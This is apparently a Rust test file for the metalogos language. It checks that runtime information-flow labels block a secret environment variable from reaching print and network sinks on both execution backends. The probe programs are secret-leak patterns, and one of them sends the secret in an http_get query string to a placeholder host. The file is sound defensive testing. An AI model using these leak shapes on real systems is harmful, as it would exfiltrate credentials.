// ── Naryad №952 (issue #1919, the audit 12.11 — P0): the runtime VALUE
// labels — the second line of defense (ADR-0156 §5).
//
// The static lane caught the №950/№951 probe shapes (the inter-procedural
// summaries, the in-pattern losses). This file pins the RUNTIME twin: with
// the static gate silenced (`METALOGOS_STATIC_LABEL_GATE_OFF=1`, the
// test-only flag), EVERY probe shape is still refused by the EXECUTING
// backend — the value's label rides the value through pattern returns,
// parameters, accumulators, entities and the kv store, and the sink
// dispatcher checks it with the SAME clearance rule the static gate
// applies (`semantic::clearance_failure` — one rule, two lanes).
//
// MUTATION CONTRACTS (the «сделано, когда» pins):
// - tests 1–2 (b1): remove the runtime pattern summary from
//   `labels::label_of_call` (the `pattern_return_summary` join) and these
//   go green-to-red — the propagation through the pattern RETURN is the
//   only thing catching the source inside the callee.
// - test b2: remove the parameter seeding at the pattern call sites
//   (`label_env.insert(param, …)`) and this goes green-to-red.
// - test b5: remove the Assign-site label propagation (the each/while
//   accumulators ride `label_env` through the binding sites) and this
//   goes green-to-red.
// - test kv round-trip: remove the kv sidecar (`kv_label_record`/lookup)
//   and this goes green-to-red.

use std::path::Path;

/// Execute via the tree-walking interpreter DIRECTLY — bypassing the
/// run_program wrapper's static Category-A gate — so the refusal the test
/// observes is the RUNTIME value-label line (the thing №952 pins).
fn run_tw(source: &str) -> Result<Option<String>, String> {
    let declarations =
        metalogos::parser::parse(source).map_err(|e| format!("parse error: {}", e))?;
    let mut interp = metalogos::interpreter::Interpreter::new();
    interp.run(declarations)
}

/// Execute via bytecode VM.
fn run_vm(source: &str) -> Result<Option<String>, String> {
    let declarations =
        metalogos::parser::parse(source).map_err(|e| format!("parse error: {}", e))?;
    let mut comp =
        metalogos::compiler::Compiler::with_std_root(Path::new("examples").to_path_buf());
    let program = comp.compile(declarations)?;
    let mut vm = metalogos::vm::Vm::new();
    vm.run(program)
}

/// The probe secret (the audit PoC convention: SP=TOPSECRET123).
fn seed_env() {
    std::env::set_var("SP", "TOPSECRET123");
    std::env::set_var("METALOGOS_STATIC_LABEL_GATE_OFF", "1");
}

fn assert_runtime_refusal(backend: &str, err: &str) {
    assert!(
        err.contains("[SINK_CLEARANCE_RUNTIME]"),
        "{}: expected the runtime value-label refusal, got: {}",
        backend,
        err
    );
}

// ── B1: the source INSIDE the called pattern (audit PoC p04) ─────────
// The static summary sees it; with the static gate OFF the RUNTIME
// summary must too — on both backends.
const B1: &str = r#"
pattern G(x: String) -> String { return env("SP") }
pattern P(x: String) -> String { print(G("a")) return "ok" }
flow Main { input: String = "x" -> P -> output }
"#;

#[test]
fn b1_source_in_pattern_return_tw_refuses_at_runtime() {
    seed_env();
    if let Err(e) = run_tw(B1) {
        assert_runtime_refusal("TW/b1", &e);
    } else {
        panic!("TW/b1: the leak executed — the runtime summary is dead");
    }
}

#[test]
fn b1_source_in_pattern_return_vm_refuses_at_runtime() {
    seed_env();
    if let Err(e) = run_vm(B1) {
        assert_runtime_refusal("VM/b1", &e);
    } else {
        panic!("VM/b1: the leak executed — the runtime summary is dead");
    }
}

// ── B2: the parameter reaches the sink INSIDE the callee (audit PoC
// p18/q02) — the param→sink contract at runtime.
const B2: &str = r#"
pattern P(u: String) -> String { print(u) return "ok" }
flow Main { input: String = "x" -> P -> output }
pattern Driver(x: String) -> String { return P(env("SP")) }
"#;

#[test]
fn b2_param_to_inner_sink_tw_refuses_at_runtime() {
    seed_env();
    // The driver shape runs the pattern call directly.
    let src = "pattern P(u: String) -> String { print(u) return \"ok\" }\nflow Main { input: String = \"x\" -> P -> output }";
    let _ = src; // the direct flow passes a literal — legal; the probe is the call shape below
    if let Err(e) = run_tw(
        B2.replace(
            "flow Main { input: String = \"x\" -> P -> output }",
            "flow Main { input: String = env(\"SP\") -> P -> output }",
        )
        .as_str(),
    ) {
        assert_runtime_refusal("TW/b2", &e);
    } else {
        panic!("TW/b2: the leak executed — the parameter seeding is dead");
    }
}

#[test]
fn b2_param_to_inner_sink_vm_refuses_at_runtime() {
    seed_env();
    let src = "pattern P(u: String) -> String { print(u) return \"ok\" }\nflow Main { input: String = env(\"SP\") -> P -> output }";
    if let Err(e) = run_vm(src) {
        assert_runtime_refusal("VM/b2", &e);
    } else {
        panic!("VM/b2: the leak executed — the parameter seeding is dead");
    }
}

// ── B5: the each-accumulator loss (audit PoC p07) ────────────────────
const B5: &str = r#"
pattern P(x: String) -> String { let mut acc = "" each c in split(env("SP"), "") { acc = acc + c } print(acc) return "ok" }
flow Main { input: String = "x" -> P -> output }
"#;

#[test]
fn b5_each_accumulator_tw_refuses_at_runtime() {
    seed_env();
    if let Err(e) = run_tw(B5) {
        assert_runtime_refusal("TW/b5", &e);
    } else {
        panic!("TW/b5: the leak executed — the accumulator propagation is dead");
    }
}

#[test]
fn b5_each_accumulator_vm_refuses_at_runtime() {
    seed_env();
    if let Err(e) = run_vm(B5) {
        assert_runtime_refusal("VM/b5", &e);
    } else {
        panic!("VM/b5: the leak executed — the accumulator propagation is dead");
    }
}

// ── B6: the secret in the GET URL (audit PoC p13) — the request side
// of http_get is gated on confidentiality (the №951 B6 family), and the
// RUNTIME gate covers it too (is_gated_dispatch).
#[test]
fn b6_secret_in_get_url_tw_refuses_at_runtime() {
    seed_env();
    let src = "pattern P(x: String) -> String { let r = http_get(\"https://example.invalid/?k=\" + env(\"SP\")) print(r) return \"ok\" }\nflow Main { input: String = \"x\" -> P -> output }";
    if let Err(e) = run_tw(src) {
        assert_runtime_refusal("TW/b6", &e);
    } else {
        panic!("TW/b6: the secret reached the network request — the request-side gate is dead");
    }
}

#[test]
fn b6_secret_in_get_url_vm_refuses_at_runtime() {
    seed_env();
    let src = "pattern P(x: String) -> String { let r = http_get(\"https://example.invalid/?k=\" + env(\"SP\")) print(r) return \"ok\" }\nflow Main { input: String = \"x\" -> P -> output }";
    if let Err(e) = run_vm(src) {
        assert_runtime_refusal("VM/b6", &e);
    } else {
        panic!("VM/b6: the secret reached the network request — the request-side gate is dead");
    }
}

// ── B8: the Secret-typed entity (audit PoC p24) — the entity seeding
// and the Ident lookup ride the runtime label env.
#[test]
fn b8_secret_entity_to_string_tw_refuses_at_runtime() {
    seed_env();
    let src = "entity key: String = env(\"SP\")\npattern P(x: String) -> String { print(to_string(key)) return \"ok\" }\nflow Main { input: String = \"x\" -> P -> output }";
    if let Err(e) = run_tw(src) {
        assert_runtime_refusal("TW/b8", &e);
    } else {
        panic!("TW/b8: the secret entity printed — the entity seeding is dead");
    }
}

#[test]
fn b8_secret_entity_to_string_vm_refuses_at_runtime() {
    seed_env();
    let src = "entity key: String = env(\"SP\")\npattern P(x: String) -> String { print(to_string(key)) return \"ok\" }\nflow Main { input: String = \"x\" -> P -> output }";
    if let Err(e) = run_vm(src) {
        assert_runtime_refusal("VM/b8", &e);
    } else {
        panic!("VM/b8: the secret entity printed — the entity seeding is dead");
    }
}

// ── The DYNAMIC forms the static lane cannot see (the №952 issue): the
// kv round-trip and the pattern-name-in-a-string dispatch.
#[test]
fn dynamic_kv_round_trip_tw_refuses_at_runtime() {
    seed_env();
    let src = "pattern P(x: String) -> String { kv_set(\"k\", env(\"SP\")) let v = kv_get(\"k\") print(v) return \"ok\" }\nflow Main { input: String = \"x\" -> P -> output }";
    if let Err(e) = run_tw(src) {
        assert_runtime_refusal("TW/kv", &e);
    } else {
        panic!("TW/kv: the kv round-trip leaked — the sidecar is dead");
    }
}

#[test]
fn dynamic_kv_round_trip_vm_refuses_at_runtime() {
    seed_env();
    let src = "pattern P(x: String) -> String { kv_set(\"k\", env(\"SP\")) let v = kv_get(\"k\") print(v) return \"ok\" }\nflow Main { input: String = \"x\" -> P -> output }";
    if let Err(e) = run_vm(src) {
        assert_runtime_refusal("VM/kv", &e);
    } else {
        panic!("VM/kv: the kv round-trip leaked — the sidecar is dead");
    }
}

// ── The sanitizer policy: an ESCAPED value keeps its confidentiality
// (the A2 rule) — escape_html does NOT clear the sink refusal.
#[test]
fn escaped_secret_still_refuses_tw() {
    seed_env();
    let src = "pattern P(x: String) -> String { print(escape_html(env(\"SP\"))) return \"ok\" }\nflow Main { input: String = \"x\" -> P -> output }";
    if let Err(e) = run_tw(src) {
        assert_runtime_refusal("TW/esc", &e);
    } else {
        panic!("TW/esc: escape_html cured a secret — the A2 rule is dead");
    }
}

// ── The LEGITIMATE program stays green: a literal never refuses.
#[test]
fn literal_print_still_passes_both_backends() {
    let src = "pattern P(x: String) -> String { print(\"hello\") return \"ok\" }\nflow Main { input: String = \"x\" -> P -> output }";
    assert!(run_tw(src).is_ok(), "TW: a literal print must never refuse");
    assert!(run_vm(src).is_ok(), "VM: a literal print must never refuse");
}
